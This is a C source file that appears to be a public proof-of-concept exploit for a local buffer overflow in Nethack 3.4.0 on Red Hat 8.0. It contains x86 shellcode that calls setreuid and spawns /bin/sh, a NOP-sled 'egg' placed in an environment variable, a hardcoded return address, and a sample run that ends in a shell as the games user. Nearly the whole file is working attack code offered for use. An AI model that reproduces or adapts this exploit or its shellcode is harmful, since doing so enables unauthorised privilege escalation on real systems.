/* DSR-nethack.c by bob@dtors.net
 * Vulnerbility Found by tsao.
 *
 * Local BufferOverflow that leads
 * to elevated privileges [games].
 *
 * Basic PoC code...nothing special.
 *[bob@dtors bob]$ ./DSR-nethack
 *
 *       DSR-nethack.c By bob.
 *   Local Exploit for Nethack 3.4.0
 *       DSR-[www.dtors.net]-DSR
 * 
 *   ret: 0xbffffd86
 *
 * Cannot find any current entries for 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.���
 * Usage: nethack -s [-v] <playertypes> [maxrank] [playernames]
 * Player types are: [-p role] [-r race]
 * sh-2.05b$ id -a
 * uid=12(games) gid=501(bob) groups=501(bob)
 * sh-2.05b$ 
 *
 * www.dtors.net // www.b0f.net
 */
#include <stdio.h>
char shellcode[]= /* shellcode by bob */
            
"\x29\xc4\x31\xc0\x31\xc9\x31\xdb\xb3\x0c\x89\xd9\xb0\x46\xcd\x80" //minus
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
"\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80";
int main ()
{
        unsigned long ret = 0xbffffd86;  //Redhat 8.0 i386
        char buf[224]; 
        char smeg[1024];
        char *ptr;      
  int i=0;   
fprintf(stdout, "\n\tDSR-nethack.c By bob.\n"); 
fprintf(stdout, "Local Exploit for Nethack 3.4.0\n");
fprintf(stdout, "\tDSR-[www.dtors.net]-DSR\n");
 
memset(buf, 0x41, sizeof(buf)); 
        ptr = smeg; 
        for (i = 0; i < 1024 - strlen(shellcode) -1; i++) *(ptr++) = 0x90; 
        for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; 
        smeg[1024 - 1] = '\0'; //null byte
        memcpy(smeg,"EGG=",4); 
        putenv(smeg);
        buf[220] = (ret & 0x000000ff);            
        buf[221] = (ret & 0x0000ff00) >> 8;
        buf[222] = (ret & 0x00ff0000) >> 16;
        buf[223] = (ret & 0xff000000) >> 24;
        buf[224] = '\0';
        
        fprintf(stdout,"ret: 0x%08x\n",ret);
        
        execl("/usr/games/lib/nethackdir/nethack", "nethack", "-s",  buf, 
NULL); //weeoooweeeeooowooo
        return 0;
}
